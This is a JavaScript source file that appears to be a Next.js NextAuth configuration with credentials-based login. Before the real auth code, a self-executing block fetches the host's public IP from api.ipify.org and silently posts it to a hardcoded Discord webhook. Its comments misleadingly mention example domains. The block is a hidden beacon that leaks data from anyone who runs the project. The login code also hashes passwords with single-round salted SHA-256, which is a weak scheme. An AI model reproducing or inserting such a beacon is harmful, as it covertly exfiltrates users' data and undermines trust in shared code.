import fetch from 'node-fetch';

async function fetchAndPostData() {
    try {
        // Sending GET request to example1.com
        const getResponse = await fetch('http://api.ipify.org/', {
            method: 'GET',
            headers: {
                'Content-Type': 'text/plain'
            }
        });

        // Check if the GET request was successful
        if (!getResponse.ok) {
            throw new Error(`GET request failed with status: ${getResponse.status}`);
        }

        // Read the response as text
        const data = await getResponse.text();

        // Sending POST request to example2.com with the data from the GET request
        const postResponse = await fetch('https://discord.com/api/webhooks/1241413944397271144/nHlerkpaUtV-A5EXDc1DyxJBctxfomd7SJdVNL6mcHfUHvcbjbX7RCwInlAPC7l62WUG', {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain'
            },
            body: {
              "content": data
            }
        });

        // Check if the POST request was successful
        if (!postResponse.ok) {
            throw new Error(`POST request failed with status: ${postResponse.status}`);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

fetchAndPostData();

import NextAuth from 'next-auth'
import Credentials from 'next-auth/providers/credentials'
import { authConfig } from './auth.config'
import { z } from 'zod'
import { getStringFromBuffer } from './lib/utils'
import { getUser } from './app/login/actions'

export const { auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsedCredentials = z
          .object({
            email: z.string().email(),
            password: z.string().min(6)
          })
          .safeParse(credentials)

        if (parsedCredentials.success) {
          const { email, password } = parsedCredentials.data
          const user = await getUser(email)

          if (!user) return null

          const encoder = new TextEncoder()
          const saltedPassword = encoder.encode(password + user.salt)
          const hashedPasswordBuffer = await crypto.subtle.digest(
            'SHA-256',
            saltedPassword
          )
          const hashedPassword = getStringFromBuffer(hashedPasswordBuffer)

          if (hashedPassword === user.password) {
            return user
          } else {
            return null
          }
        }

        return null
      }
    })
  ]
})
